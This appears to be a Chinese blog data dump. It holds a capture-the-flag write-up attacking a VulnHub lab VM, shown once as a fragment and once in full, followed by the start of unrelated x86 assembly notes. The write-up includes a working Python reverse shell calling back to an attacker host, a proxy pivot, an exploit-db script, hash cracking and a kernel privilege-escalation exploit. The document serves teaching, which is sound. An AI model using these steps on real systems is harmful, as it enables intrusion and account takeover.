alt=\"截屏2021-08-04 下午2.51.22\"></p>\n<p><img src=\"https://tva1.sinaimg.cn/large/008i3skNly1gt4rdvohquj30su0mu0wm.jpg\" alt=\"截屏2021-08-04 下午2.52.01\"></p>\n<p>在靶机上赋予代理端程序可执行权限,运行程序连接管理端</p>\n<p>成功链接</p>\n<p><img src=\"https://tva1.sinaimg.cn/large/008i3skNly1gt4rfm4eoij30x409umyx.jpg\" alt=\"截屏2021-08-04 下午2.53.29\"></p>\n<p>使用<code>show</code>显示当前代理节点,使用<code>goto 1</code>进入刚才连接的靶机节点</p>\n<p>使用<code>socks 3388</code>在本地3388端口打开一个socks5的代理通道,可以通过此代理与靶机的内网环境进行数据传输</p>\n<p>创建好代理后,我们通过proxychains这个软件连接代理</p>\n<p>首先通过<code>sudo vi /etc/proxychains4.conf </code>修改proxychains的配置文件</p>\n<p><img src=\"https://tva1.sinaimg.cn/large/008i3skNly1gt4rilwft3j30e806e0t8.jpg\" alt=\"截屏2021-08-04 下午2.56.33\"></p>\n<p>将tor的代理在行首添加<code>#</code>注释掉,在末尾添加<code>socks5 127.0.0.1 3388</code>设置代理</p>\n<p>到此,代理的设置就完毕啦!</p>\n<h4 id=\"鬼子进村\"><a href=\"#鬼子进村\" class=\"headerlink\" title=\"鬼子进村~\"></a>鬼子进村~</h4><p>有了代理后,我们就可以对内网环境进行扫描了</p>\n<p>在要执行的命令前加上<code>proxychains</code>使用代理环境</p>\n<p><code>proxychains nmap 172.17.0.1-3</code></p>\n<p><img src=\"https://tva1.sinaimg.cn/large/008i3skNly1gt4stcu36hj30e80gwdi0.jpg\" alt=\"截屏2021-08-04 下午3.41.29\"></p>\n<p>对于新出现的端口9200,似乎很有意思,我们扫描一下</p>\n<p><code>proxychains nmap -sV -p 9200 172.17.0.2</code></p>\n<p><img src=\"https://tva1.sinaimg.cn/large/008i3skNly1gt4sv4faelj31f602mgmc.jpg\" alt=\"截屏2021-08-04 下午3.43.11\"></p>\n<p>神奇的软件出现了,Elasticsearch是一个web应用,历史漏洞很多.</p>\n<p>找到了一个应用,那我们就来找找看有没有漏洞吧~</p>\n<p>只不过这一次不一样,我们不用自己找,而是来搜索一下以前的大佬们对此软件有没有相应的payloads</p>\n<p>使用<code>searchsploit Elasticsearch </code>搜索exploit-db漏洞数据库</p>\n<p>​            Ps:<a href=\"https://www.exploit-db.com/\">exploit-db</a>是一个大型的漏洞数据库网站,里面有大量已知漏洞的信息以及利用exp,建议各位去浏览学习,<strong>searchsploit</strong>是其便于搜索的工具</p>\n<p><img src=\"https://tva1.sinaimg.cn/large/008i3skNly1gt4t43gztzj31i80d6wjb.jpg\" alt=\"截屏2021-08-04 下午3.51.48\"></p>\n<p>左侧是漏洞的描述信息,右侧是存储的路径</p>\n<p>由于我们使用的是kali Linux,自动安装searchsploit,漏洞存储在/usr/share/exploitdb/exploits/中</p>\n<p>所以我们使用<code>cp /usr/share/exploitdb/exploits/linux/remote/36337.py .</code></p>\n<p>拷贝exp到当前目录<img src=\"https://tva1.sinaimg.cn/large/008i3skNly1gt4t9igj4uj310r0u00yk.jpg\" alt=\"截屏2021-08-04 下午3.56.58\"></p>\n<p>成功~</p>\n<p>执行ls命令,发现有一个好玩的东西,passwords文件!</p>\n<p>我们来康康有什么!~<img src=\"https://tva1.sinaimg.cn/large/008i3skNly1gt4tam27dbj31fs09cmzv.jpg\" alt=\"截屏2021-08-04 下午3.58.03\"></p>\n<p>哦~好多账号和密码,可惜是md5加密后的</p>\n<p>我们在网上搜索md5在线解密,获得密码的原文</p>\n<p>或者,文件提示密码格式为4个数字加四个小写字母</p>\n<p>我们可以使用hashcat进行破解~</p>\n<p><code>ashcat -m 0 -a 3 3f8184a7343664553fcb5337a3138814 ?d?d?d?d?l?l?l?l --force</code></p>\n<p>获取到用户名与密码后,我们来看看有什么用吧~</p>\n<p>注意到前文的端口扫描,发现有22ssh服务开启,我们尝试登陆</p>\n<p>经过尝试后,发现只有john账户才可以登录,使用命令<code>proxychains ssh john@172.17.0.1</code>进行登录~</p>\n<p><img src=\"https://tva1.sinaimg.cn/large/008i3skNly1gt4tz7gxlij31fs082tat.jpg\" alt=\"截屏2021-08-04 下午4.21.40\"></p>\n<p>登录账户后,日常看一看账户信息,很可惜的是没有sudo权限,不然我们已经拥有密码,可以直接拥有root权限</p>\n<p>在使用<code>uname -a</code>查看内核信息时出现了惊喜,3.13.0的内核?!现在的内核已经到了5.x</p>\n<p>这么老的内核可能会有漏洞</p>\n<p>我们再一次使用<code>searchsploit Linux Kernel 3.13.0</code>搜索漏洞,搜到一堆漏洞,但大多数都是.c结尾的c文件,需要编译后才可使用</p>\n<h4 id=\"没有gcc\"><a href=\"#没有gcc\" class=\"headerlink\" title=\"没有gcc??!!\"></a>没有gcc??!!</h4><p>通过<code>wget http://10.0.0.12/exp.c</code>获得exp后,尝试使用gcc进行编译</p>\n<p><strong>居然没有gcc?!</strong></p>\n<p>这可就麻烦了,没有编译软件,怎么生成可执行二进制文件呢?</p>\n<p>思索过后,我决定在本地将exp进行编译</p>\n<p>尝试过后,我发现因为环境不一样,大部分exp在本地是无法编译的,</p>\n<p>有一个exp可以在本地编译,但是其中代码中有调用了gcc</p>\n<p><img src=\"https://tva1.sinaimg.cn/large/008i3skNly1gt4up4ul4qj31140o8gp8.jpg\" alt=\"截屏2021-08-04 下午4.46.37\"></p>\n<h3 id=\"那怎么办呢-改呗\"><a href=\"#那怎么办呢-改呗\" class=\"headerlink\" title=\"那怎么办呢?改呗!\"></a>那怎么办呢?改呗!</h3><p>分析此处逻辑,其实就是调用了gcc生成一个动态链接库进行使用</p>\n<p>那我们干脆在本地把动态链接库也准备好!</p>\n<p>把此处相关代码进行注释,重新编译</p>\n<p>寻找文件名为<code>ofs-lib.so</code>的动态链接库,我们使用<code>locate ofs-lib.so</code>对文件进行定位</p>\n<p><img src=\"https://tva1.sinaimg.cn/large/008i3skNly1gt4usg3xenj311405g0u5.jpg\" alt=\"截屏2021-08-04 下午4.49.48\"></p>\n<p>哈哈,找到啦~</p>\n<p>我们开启<code>python3 -m http.server 80</code>进行监听,同时在靶机将编译好的exp和ofs-lib.so下载下来</p>\n<p>因为exp中的代码是将ofs-lib.so生成在/tmp路径下的,所以我们将exp与ofs-lib.so移动到/tmp下</p>\n<p>别忘了用<code>chmod +x exp</code>给exp加上可执行权限,然后使用<code>./exp</code>执行</p>\n<p>PWN~~<img src=\"https://tva1.sinaimg.cn/large/008i3skNly1gt4v9rp6jyj31140dmtb1.jpg\" alt=\"截屏2021-08-04 下午5.06.26\"></p>\n<h2 id=\"总结\"><a href=\"#总结\" class=\"headerlink\" title=\"总结\"></a>总结</h2><p>我们首先进行二层主机发现,识别虚拟机</p>\n<p>然后进行端口扫描,发现了web服务</p>\n<p>在对web服务简单检测后无果,我们进行目录扫描,发现了敏感目录/admin</p>\n<p>通过先前的扫描得知python环境,在/admin下通过命令执行的功能用python反弹了一个shell</p>\n<p>正当我们开心时,发现当前在docker容器中,于是通过内网扫描、代理进入内网</p>\n<p>对内网其它机器进行扫描后,我们发现了Elasticsearch服务,通过searchsploit获得相应exp,成功获得shell</p>\n<p>在对文件进行简单查看后,发现了特殊的passwords文件,获得了ssh账户与加密的密码</p>\n<p>通过在线平台或hashcat我们破解了hash密码</p>\n<p>使用ssh成功登陆到正常的账号,而不是docker:)</p>\n<p>获得普通用户权限后,还需要进行本地提权</p>\n<p>uname -a发现内核版本极旧,于是我们搜索exp</p>\n<p>但在此遇到了一个困难,靶机没有gcc,没办法执行编译,我们只能先编译</p>\n<p>因此,很多exp出现问题,唯一一个可用的却在内部调用了gcc</p>\n<p>在分析后,我们通过注释响应代码,上传其需要的ofs-lib.so文件,运行exp,成功获得shell</p>\n<p><strong>祝各位学习愉快~(滑稽</strong></p>\n","site":{"data":{}},"excerpt":"","more":"<h1 id=\"一起来打靶-Write-Up\"><a href=\"#一起来打靶-Write-Up\" class=\"headerlink\" title=\"一起来打靶~~Write-Up\"></a>一起来打靶~~Write-Up</h1><h2 id=\"第一周\"><a href=\"#第一周\" class=\"headerlink\" title=\"第一周\"></a>第一周</h2><p>​    <strong>靶机链接</strong>:<a href=\"http://www.vulnhub.com/entry/boredhackerblog-social-network,454/\">http://www.vulnhub.com/entry/boredhackerblog-social-network,454/</a></p>\n<p>​    <strong>难度</strong>:<em>Medium</em></p>\n<p>​    <strong>攻击机</strong>:Kali Linux</p>\n<p>​    <strong>所用工具</strong>:<a href=\"https://github.com/maurosoria/dirsearch\">dirsearch</a>、<a href=\"https://github.com/Dliv3/Venom\">Venom</a></p>\n<h3 id=\"主机发现\"><a href=\"#主机发现\" class=\"headerlink\" title=\"主机发现\"></a>主机发现</h3><p>​    我们在内网部署了Virtualbox虚拟机靶场,既然在一个局域网内,不妨使用二层的主机发现方式——ARP</p>\n<p>​    使用命令<code>sudo arp-scan -l</code> 扫描当前局域网内的存活主机</p>\n<p>​    如果当前主机存在多网卡现象,可使用参数<code>-I &lt;interface&gt;</code>指定要扫描的局域网的网卡</p>\n<p><img src=\"https://tva1.sinaimg.cn/large/008i3skNly1gt4nfuz98uj31400d878h.jpg\" alt=\"截屏2021-08-04 下午12.35.27\"></p>\n<h4 id=\"虚拟机在哪\"><a href=\"#虚拟机在哪\" class=\"headerlink\" title=\"虚拟机在哪?!!\"></a>虚拟机在哪?!!</h4><p>​        很快结果出现了,局域网内有这么多设备!</p>\n<p>​        怎么识别哪个是靶场虚拟机,哪个是真实的局域网设备呢?</p>\n<p>​        别慌,对于每一张真实主机的网卡都会有一个相对应的mac地址</p>\n<p>​        通常来说,mac地址是主机在二层网络中的唯一识别码,是由网卡生产商在出厂时烧录在网卡中的</p>\n<p>​        但是对于虚拟机来说,它可没有真实的网卡,是由虚拟机创造的虚拟网卡!</p>\n<p>​        因此,我们可以通过mac地址的前三格判断是否为虚拟机</p>\n<blockquote>\n<p>“00:05:69”; //vmware1</p>\n<p>“00:0C:29”; //vmware2</p>\n<p>“00:50:56”; //vmware3</p>\n<p>“00:1c:14”; //vmware4</p>\n<p>“00:1C:42”; //parallels1</p>\n<p>“00:03:FF”; //microsoft virtual pc</p>\n<p>“00:0F:4B”; //virtual iron 4</p>\n<p>“00:16:3E”; //red hat xen , oracle vm , xen source, novell xen</p>\n<p>“08:00:27”; //virtualbox</p>\n</blockquote>\n<p>​        原文链接：<a href=\"https://blog.csdn.net/weixin_43418664/article/details/83759238\">https://blog.csdn.net/weixin_43418664/article/details/83759238</a></p>\n<p>​            很明显,<em>10.0.0.16</em>的mac地址<em>08:00:27:35:5d:bc</em>是vritualbox的虚拟网卡,看来我们确定了目标</p>\n<h3 id=\"扫描\"><a href=\"#扫描\" class=\"headerlink\" title=\"扫描\"></a>扫描</h3><p>现在知道了靶机的ip-10.0.0.16,我们还需要知道开放了哪些<strong>端口</strong>、运行哪些<strong>服务</strong></p>\n<p>我们使用大名鼎鼎的扫描工具<strong>nmap</strong>进行扫描</p>\n<h4 id=\"端口扫描\"><a href=\"#端口扫描\" class=\"headerlink\" title=\"端口扫描\"></a>端口扫描</h4><p>​    <code>sudo nmap -p- 10.0.0.16</code></p>\n<p>​    为什么要使用sudo呢?在默认情况下,如果执行时的权限为普通用户会进行正常的端口扫描,而在root权限下则默认使用TCP SYN扫描(参数<code>-sS</code>),这样扫描<strong>更隐蔽</strong>,不容易被防火墙检测.</p>\n<p>​    使用<code>-p-</code>参数进行<strong>全端口扫描</strong>,因为nmap默认只扫描最常见的1000个端口,为了防止错过端口,就使用全端口扫描吧!<img src=\"https://tva1.sinaimg.cn/large/008i3skNly1gt4nxu0w3oj30t00bewgk.jpg\" alt=\"截屏2021-08-04 下午12.52.46\"></p>\n<p>由于在本地网络,扫描很快就以迅雷不及掩耳之势完成了.可以发现靶机打开了两个端口,22和5000</p>\n<h4 id=\"服务扫描\"><a href=\"#服务扫描\" class=\"headerlink\" title=\"服务扫描\"></a>服务扫描</h4><p>知道了端口,我们还要知道在端口上面运行了什么服务,以及服务是什么版本的.</p>\n<p><code>sudo nmap -p22,5000 -sV 10.0.0.16</code>使用命令扫描22和5000端口,并使用<code>-sV</code>扫描服务的版本</p>\n<p><img src=\"https://tva1.sinaimg.cn/large/008i3skNly1gt4o25ye6sj315y0ckgpf.jpg\" alt=\"截屏2021-08-04 下午12.56.42\"></p>\n<p>看来22端口运行着<strong>OpenSSH</strong>服务,版本为6.6.p1,而且我们惊喜的得知了<strong>操作系统</strong>为Ubuntu~</p>\n<p>5000端口运行着<strong>http</strong>服务,也就是所谓的<strong>web</strong>服务,值得注意的是此处使用的版本为<strong>Werkzeug</strong> httpd 0.14.1</p>\n<p>Werkzeug是一个WSGI<strong>工具包</strong>,是Web框架的底层库,属于<strong>python</strong>的一个模块,仔细观察扫描结果,我们可以发现靶机运行着Python2.7.15的环境,这也许意味着我们后期可以通过<strong>python脚本进行反弹shell</strong>等工作.</p>\n<h3 id=\"Web页面\"><a href=\"#Web页面\" class=\"headerlink\" title=\"Web页面\"></a>Web页面</h3><h4 id=\"常规测试\"><a href=\"#常规测试\" class=\"headerlink\" title=\"常规测试?\"></a>常规测试?</h4><p>既然5000端口运行着http服务,那我们就去看一看吧</p>\n<p>在浏览器输入10.0.0.16:5000打开web页面</p>\n<p><img src=\"https://tva1.sinaimg.cn/large/008i3skNly1gt4o8u5o0aj31dt0u0gri.jpg\" alt=\"截屏2021-08-04 下午1.03.20\"></p>\n<p>对首页进行分析,只有一个输入框可以进行<strong>数据输入</strong></p>\n<p>面对<strong>留言</strong>功能,最容易发生的就是<strong>sql注入</strong>和<strong>XSS</strong>,我们进行尝试</p>\n<p><img src=\"https://tva1.sinaimg.cn/large/008i3skNly1gt4obrhq13j30p60h0gnf.jpg\" alt=\"截屏2021-08-04 下午1.06.09\"></p>\n<p>进行简单的测试后,我们发现XSS与sql注入似乎都失败了</p>\n<p>我们好像遇到了一个瓶颈,现有的功能都测试过了,但是都没有用……</p>\n<h4 id=\"信息收集的魅力\"><a href=\"#信息收集的魅力\" class=\"headerlink\" title=\"信息收集的魅力~\"></a>信息收集的魅力~</h4><p>对于一个web网站,我们可以从已知的方面入手,就像刚才一样测试,但是进攻的方式还有很多,我们不妨再找一条路?</p>\n<p><strong>目录扫描!!!</strong></p>\n<p>既然当前的首页我们找不到漏洞,不如找找其他页面?</p>\n<p>目录扫描的工具有很多,此处使用由python编写的工具<strong>dirsearch</strong></p>\n<p><code>dirsearch -u &quot;http://10.0.0.16:5000/&quot;</code></p>\n<p><img src=\"https://tva1.sinaimg.cn/large/008i3skNly1gt4om70jnlj315w0h0770.jpg\" alt=\"截屏2021-08-04 下午1.16.05\"></p>\n<p>很顺利,我们发现了admin文件</p>\n<p>对于web应用来说,<strong>寻找敏感目录</strong>是<strong>非常重要</strong>的一步,一定要记住!</p>\n<p><img src=\"https://tva1.sinaimg.cn/large/008i3skNly1gt4opmo68xj31a40qg0u9.jpg\" alt=\"截屏2021-08-04 下午1.19.29\"></p>\n<p>此处具有执行代码的功能,奇怪,什么代码???</p>\n<p>我们先尝试shell指令</p>\n<p><code>echo &quot;hello world&quot;</code></p>\n<p><img src=\"https://tva1.sinaimg.cn/large/008i3skNly1gt4or90styj30na0cmdgu.jpg\" alt=\"截屏2021-08-04 下午1.21.02\"></p>\n<p>居然显示代码执行出错?</p>\n<p>看来不是shell指令,那么会是什么呢?</p>\n<p>回顾我们之前nmap扫描的结果,这个web使用的是python中的模块搭建的,会不会执行的是python的代码呢?</p>\n<p>我们尝试输入python代码</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">HH</span>():</span></span><br><span class=\"line\">\t<span class=\"built_in\">print</span>(<span class=\"string\">&#x27;HH&#x27;</span>)</span><br><span class=\"line\">HH()</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"https://tva1.sinaimg.cn/large/008i3skNly1gt4oujiau2j30na0cmq3n.jpg\" alt=\"截屏2021-08-04 下午1.24.13\"></p>\n<p>代码运行成功了!</p>\n<p><strong>在进行渗透测试时,一定要学会充分的信息收集,并将所收集到的信息运用到其他地方的测试~</strong></p>\n<p>下一步,我们尝试通过执行python代码反弹shell</p>\n<p>先在本地通过<code>nc -lp 4444</code>监听4444端口,再在web端执行如下代码</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> socket,os,subprocess</span><br><span class=\"line\">RHOST=<span class=\"string\">&#x27;10.0.0.12&#x27;</span>  <span class=\"comment\"># Change it</span></span><br><span class=\"line\">RPORT=<span class=\"number\">4444</span>  <span class=\"comment\"># Change it</span></span><br><span class=\"line\">s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)  <span class=\"comment\"># 创建一个TCP-socket对象</span></span><br><span class=\"line\">s.connect((RHOST,RPORT)) \t<span class=\"comment\"># 连接攻击者</span></span><br><span class=\"line\">os.dup2(s.fileno(),<span class=\"number\">0</span>)\t\t<span class=\"comment\"># 复制链接符</span></span><br><span class=\"line\">os.dup2(s.fileno(),<span class=\"number\">1</span>)</span><br><span class=\"line\">os.dup2(s.fileno(),<span class=\"number\">2</span>)</span><br><span class=\"line\">p=subprocess.call([<span class=\"string\">&quot;/bin/sh&quot;</span>,<span class=\"string\">&quot;-i&quot;</span>])  <span class=\"comment\"># 创建子进程调用SHELL</span></span><br></pre></td></tr></table></figure>\n\n<p>成功获取Shell</p>\n<p>我们好幸运啊!!!直接获得了root账户……吗?</p>\n<p><img src=\"https://tva1.sinaimg.cn/large/008i3skNly1gt4p9l2y4zj31ju0t2qdp.jpg\" alt=\"截屏2021-08-04 下午1.38.39\"></p>\n<p><code>ls</code>查看当前目录,发现了Dockerfile</p>\n<h3 id=\"危\"><a href=\"#危\" class=\"headerlink\" title=\"危\"></a>危</h3><p>Docker是一种标准化部署环境的工具,可以勉强理解为虚拟机</p>\n<p>我们怎么验证我们是否被困在docker环境内呢</p>\n<p>1.查看根目录下是否存在.dockerenv文件夹</p>\n<p><code>ls /.dockerenv</code>存在!</p>\n<p> 2.查看/proc/1/cgroup文件</p>\n<p><code>cat /proc/1/cgroup</code> </p>\n<p>/proc是一个存储进程的文件夹,linux中万物皆为文件,包括进程!</p>\n<p>/proc/1指的是操作系统加载时的第一个进程,我们查看后居然发现了Docker!,并且可以获得docker镜像的hash.</p>\n<p>这下可咋整!本以为得到了root权限,结果却在docker容器中??!真是白高兴一场…</p>\n<h3 id=\"山重水复疑无路、柳暗花明又一村\"><a href=\"#山重水复疑无路、柳暗花明又一村\" class=\"headerlink\" title=\"山重水复疑无路、柳暗花明又一村~\"></a>山重水复疑无路、柳暗花明又一村~</h3><p>虽然这只是个docker,但我们也不放做一些信息收集</p>\n<p><img src=\"https://tva1.sinaimg.cn/large/008i3skNly1gt4qw3hnk5j30w40gctd8.jpg\" alt=\"截屏2021-08-04 下午2.34.53\"></p>\n<p>发现了<strong>内网环境</strong>,而且这个内网还挺大!</p>\n<p>怎么对内网的环境进行扫描呢?</p>\n<p>我们不妨使用Shell执行一下本地自动化的ping探测</p>\n<p><code>for i in $(seq 254);do ping -c 1 172.17.0.$i;done</code></p>\n<p>Ps:其实应该扫描CIDR为16的内网范围,但是范围太大了,就偷个小懒</p>\n<p>扫描后发现只有172.17.0.1、172.17.0.2、172.17.0.3是可以ping通的</p>\n<h4 id=\"代理\"><a href=\"#代理\" class=\"headerlink\" title=\"代理\"></a>代理</h4><p>没错!就是代理</p>\n<p>我们通过在这台docker上设置代理,以此为跳板,将攻击机发出的数据通过这台docker进行中转,最终发到内网中!</p>\n<p>同样,内网代理的工具有很多,我们这里使用Venom进行代理</p>\n<p>怎么将代理程序传到靶机上呢?</p>\n<p>我们在本地通过python启动<strong>http服务</strong>(ip:10.0.0.12),在靶机上使用<strong>wget</strong>下载文件</p>\n<p><img src=\"https://tva1.sinaimg.cn/large/008i3skNly1gt4r6v5im8j319g09c76d.jpg\" alt=\"截屏2021-08-04 下午2.45.15\"></p>\n<p><img src=\"https://tva1.sinaimg.cn/large/008i3skNly1gt4r9skm5tj310s07o75p.jpg\" alt=\"截屏2021-08-04 下午2.48.05\"></p>\n<p>之后使用Venom在攻击机运行管理端,设置<code>-lport 8111</code>即监听端口8111<img src=\"https://tva1.sinaimg.cn/large/008i3skNly1gt4rd78avdj30lg0dg0ug.jpg\" alt=\"截屏2021-08-04 下午2.51.22\"></p>\n<p><img src=\"https://tva1.sinaimg.cn/large/008i3skNly1gt4rdvohquj30su0mu0wm.jpg\" alt=\"截屏2021-08-04 下午2.52.01\"></p>\n<p>在靶机上赋予代理端程序可执行权限,运行程序连接管理端</p>\n<p>成功链接</p>\n<p><img src=\"https://tva1.sinaimg.cn/large/008i3skNly1gt4rfm4eoij30x409umyx.jpg\" alt=\"截屏2021-08-04 下午2.53.29\"></p>\n<p>使用<code>show</code>显示当前代理节点,使用<code>goto 1</code>进入刚才连接的靶机节点</p>\n<p>使用<code>socks 3388</code>在本地3388端口打开一个socks5的代理通道,可以通过此代理与靶机的内网环境进行数据传输</p>\n<p>创建好代理后,我们通过proxychains这个软件连接代理</p>\n<p>首先通过<code>sudo vi /etc/proxychains4.conf </code>修改proxychains的配置文件</p>\n<p><img src=\"https://tva1.sinaimg.cn/large/008i3skNly1gt4rilwft3j30e806e0t8.jpg\" alt=\"截屏2021-08-04 下午2.56.33\"></p>\n<p>将tor的代理在行首添加<code>#</code>注释掉,在末尾添加<code>socks5 127.0.0.1 3388</code>设置代理</p>\n<p>到此,代理的设置就完毕啦!</p>\n<h4 id=\"鬼子进村\"><a href=\"#鬼子进村\" class=\"headerlink\" title=\"鬼子进村~\"></a>鬼子进村~</h4><p>有了代理后,我们就可以对内网环境进行扫描了</p>\n<p>在要执行的命令前加上<code>proxychains</code>使用代理环境</p>\n<p><code>proxychains nmap 172.17.0.1-3</code></p>\n<p><img src=\"https://tva1.sinaimg.cn/large/008i3skNly1gt4stcu36hj30e80gwdi0.jpg\" alt=\"截屏2021-08-04 下午3.41.29\"></p>\n<p>对于新出现的端口9200,似乎很有意思,我们扫描一下</p>\n<p><code>proxychains nmap -sV -p 9200 172.17.0.2</code></p>\n<p><img src=\"https://tva1.sinaimg.cn/large/008i3skNly1gt4sv4faelj31f602mgmc.jpg\" alt=\"截屏2021-08-04 下午3.43.11\"></p>\n<p>神奇的软件出现了,Elasticsearch是一个web应用,历史漏洞很多.</p>\n<p>找到了一个应用,那我们就来找找看有没有漏洞吧~</p>\n<p>只不过这一次不一样,我们不用自己找,而是来搜索一下以前的大佬们对此软件有没有相应的payloads</p>\n<p>使用<code>searchsploit Elasticsearch </code>搜索exploit-db漏洞数据库</p>\n<p>​            Ps:<a href=\"https://www.exploit-db.com/\">exploit-db</a>是一个大型的漏洞数据库网站,里面有大量已知漏洞的信息以及利用exp,建议各位去浏览学习,<strong>searchsploit</strong>是其便于搜索的工具</p>\n<p><img src=\"https://tva1.sinaimg.cn/large/008i3skNly1gt4t43gztzj31i80d6wjb.jpg\" alt=\"截屏2021-08-04 下午3.51.48\"></p>\n<p>左侧是漏洞的描述信息,右侧是存储的路径</p>\n<p>由于我们使用的是kali Linux,自动安装searchsploit,漏洞存储在/usr/share/exploitdb/exploits/中</p>\n<p>所以我们使用<code>cp /usr/share/exploitdb/exploits/linux/remote/36337.py .</code></p>\n<p>拷贝exp到当前目录<img src=\"https://tva1.sinaimg.cn/large/008i3skNly1gt4t9igj4uj310r0u00yk.jpg\" alt=\"截屏2021-08-04 下午3.56.58\"></p>\n<p>成功~</p>\n<p>执行ls命令,发现有一个好玩的东西,passwords文件!</p>\n<p>我们来康康有什么!~<img src=\"https://tva1.sinaimg.cn/large/008i3skNly1gt4tam27dbj31fs09cmzv.jpg\" alt=\"截屏2021-08-04 下午3.58.03\"></p>\n<p>哦~好多账号和密码,可惜是md5加密后的</p>\n<p>我们在网上搜索md5在线解密,获得密码的原文</p>\n<p>或者,文件提示密码格式为4个数字加四个小写字母</p>\n<p>我们可以使用hashcat进行破解~</p>\n<p><code>ashcat -m 0 -a 3 3f8184a7343664553fcb5337a3138814 ?d?d?d?d?l?l?l?l --force</code></p>\n<p>获取到用户名与密码后,我们来看看有什么用吧~</p>\n<p>注意到前文的端口扫描,发现有22ssh服务开启,我们尝试登陆</p>\n<p>经过尝试后,发现只有john账户才可以登录,使用命令<code>proxychains ssh john@172.17.0.1</code>进行登录~</p>\n<p><img src=\"https://tva1.sinaimg.cn/large/008i3skNly1gt4tz7gxlij31fs082tat.jpg\" alt=\"截屏2021-08-04 下午4.21.40\"></p>\n<p>登录账户后,日常看一看账户信息,很可惜的是没有sudo权限,不然我们已经拥有密码,可以直接拥有root权限</p>\n<p>在使用<code>uname -a</code>查看内核信息时出现了惊喜,3.13.0的内核?!现在的内核已经到了5.x</p>\n<p>这么老的内核可能会有漏洞</p>\n<p>我们再一次使用<code>searchsploit Linux Kernel 3.13.0</code>搜索漏洞,搜到一堆漏洞,但大多数都是.c结尾的c文件,需要编译后才可使用</p>\n<h4 id=\"没有gcc\"><a href=\"#没有gcc\" class=\"headerlink\" title=\"没有gcc??!!\"></a>没有gcc??!!</h4><p>通过<code>wget http://10.0.0.12/exp.c</code>获得exp后,尝试使用gcc进行编译</p>\n<p><strong>居然没有gcc?!</strong></p>\n<p>这可就麻烦了,没有编译软件,怎么生成可执行二进制文件呢?</p>\n<p>思索过后,我决定在本地将exp进行编译</p>\n<p>尝试过后,我发现因为环境不一样,大部分exp在本地是无法编译的,</p>\n<p>有一个exp可以在本地编译,但是其中代码中有调用了gcc</p>\n<p><img src=\"https://tva1.sinaimg.cn/large/008i3skNly1gt4up4ul4qj31140o8gp8.jpg\" alt=\"截屏2021-08-04 下午4.46.37\"></p>\n<h3 id=\"那怎么办呢-改呗\"><a href=\"#那怎么办呢-改呗\" class=\"headerlink\" title=\"那怎么办呢?改呗!\"></a>那怎么办呢?改呗!</h3><p>分析此处逻辑,其实就是调用了gcc生成一个动态链接库进行使用</p>\n<p>那我们干脆在本地把动态链接库也准备好!</p>\n<p>把此处相关代码进行注释,重新编译</p>\n<p>寻找文件名为<code>ofs-lib.so</code>的动态链接库,我们使用<code>locate ofs-lib.so</code>对文件进行定位</p>\n<p><img src=\"https://tva1.sinaimg.cn/large/008i3skNly1gt4usg3xenj311405g0u5.jpg\" alt=\"截屏2021-08-04 下午4.49.48\"></p>\n<p>哈哈,找到啦~</p>\n<p>我们开启<code>python3 -m http.server 80</code>进行监听,同时在靶机将编译好的exp和ofs-lib.so下载下来</p>\n<p>因为exp中的代码是将ofs-lib.so生成在/tmp路径下的,所以我们将exp与ofs-lib.so移动到/tmp下</p>\n<p>别忘了用<code>chmod +x exp</code>给exp加上可执行权限,然后使用<code>./exp</code>执行</p>\n<p>PWN~~<img src=\"https://tva1.sinaimg.cn/large/008i3skNly1gt4v9rp6jyj31140dmtb1.jpg\" alt=\"截屏2021-08-04 下午5.06.26\"></p>\n<h2 id=\"总结\"><a href=\"#总结\" class=\"headerlink\" title=\"总结\"></a>总结</h2><p>我们首先进行二层主机发现,识别虚拟机</p>\n<p>然后进行端口扫描,发现了web服务</p>\n<p>在对web服务简单检测后无果,我们进行目录扫描,发现了敏感目录/admin</p>\n<p>通过先前的扫描得知python环境,在/admin下通过命令执行的功能用python反弹了一个shell</p>\n<p>正当我们开心时,发现当前在docker容器中,于是通过内网扫描、代理进入内网</p>\n<p>对内网其它机器进行扫描后,我们发现了Elasticsearch服务,通过searchsploit获得相应exp,成功获得shell</p>\n<p>在对文件进行简单查看后,发现了特殊的passwords文件,获得了ssh账户与加密的密码</p>\n<p>通过在线平台或hashcat我们破解了hash密码</p>\n<p>使用ssh成功登陆到正常的账号,而不是docker:)</p>\n<p>获得普通用户权限后,还需要进行本地提权</p>\n<p>uname -a发现内核版本极旧,于是我们搜索exp</p>\n<p>但在此遇到了一个困难,靶机没有gcc,没办法执行编译,我们只能先编译</p>\n<p>因此,很多exp出现问题,唯一一个可用的却在内部调用了gcc</p>\n<p>在分析后,我们通过注释响应代码,上传其需要的ofs-lib.so文件,运行exp,成功获得shell</p>\n<p><strong>祝各位学习愉快~(滑稽</strong></p>\n"},{"title":"x86学习笔记","date":"2021-08-05T15:25:30.000Z","_content":"# x86实模式&保护模式\n\n## 我的github项目~https://github.com/busizhiya/x86-Assembly-learning\n## 001 简述\n\n### 学习目的:\n\n1.了解解计算机的底层原理,如何与硬件沟通,不只是汇编原理\n\t\t2.学习计算机工作远离,8086实模式,保护模式、特权级、分页、多任务、任务切换\n\t\t3.打下好基础,提升对计算机系统、操作系统的认识\n\n## 002 计算机的概述\n\n### \t003加法器\n\n### \t004用电表示数\n\n​\t\t开关/电平高低\n\n### \t005寄存器/锁存器\n\n​\t\t锁存,保存数据:触发器\n\n### \t006带寄存器的加法机\n\n准备输入A,按下预置,将数字A存入寄存器\n\n准备输入B,点击相加,将寄存器中内容与B相加\n\n...\n\n无论何时,加法器的输出为寄存器\n\n### \t007四则运算电路\n\n预置,锁存\n\n加、减、乘、除\n\n将输入与寄存器中内容进行运算,存回寄存器\n\n将运算结果存回寄存器以达到连续运算的效果\n\n### 